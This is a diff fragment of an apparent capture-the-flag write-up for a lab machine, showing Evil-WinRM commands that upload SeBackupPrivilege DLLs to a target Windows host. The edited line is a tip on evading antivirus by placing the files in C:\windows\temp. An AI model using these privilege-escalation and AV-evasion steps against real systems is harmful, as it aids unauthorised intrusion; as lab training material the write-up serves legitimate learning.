@@ -45,7 +45,7 @@ STEP 2: Upload to the target machine
 ### for winrm
 powershell> upload SeBackupPrivilegeCmdLets.dll
 powershell> upload SeBackupPrivilegeUtils.dll
-N/B: One of the challenge i got with this malicious file is that the AV was blocking me from uploading into a normal directory so i had to find a best place where this AD could not reach.
+N/B: One of the challenge i got with this malicious file is that the AV was blocking me from uploading into a normal directory so i had to find a best place where this AntiVirus(AV) could not delete them which was 'C:\windows\temp\'.
 OUTPUT:
 *Evil-WinRM* PS C:\windows\temp> upload SeBackupPrivilegeUtils.dll
 Info: Uploading /home/alienx/Desktop/MACHINES/SEASON-6/CICADA/SeBackupPrivilegeUtils.dll to C:\windows\temp\SeBackupPrivilegeUtils.dll
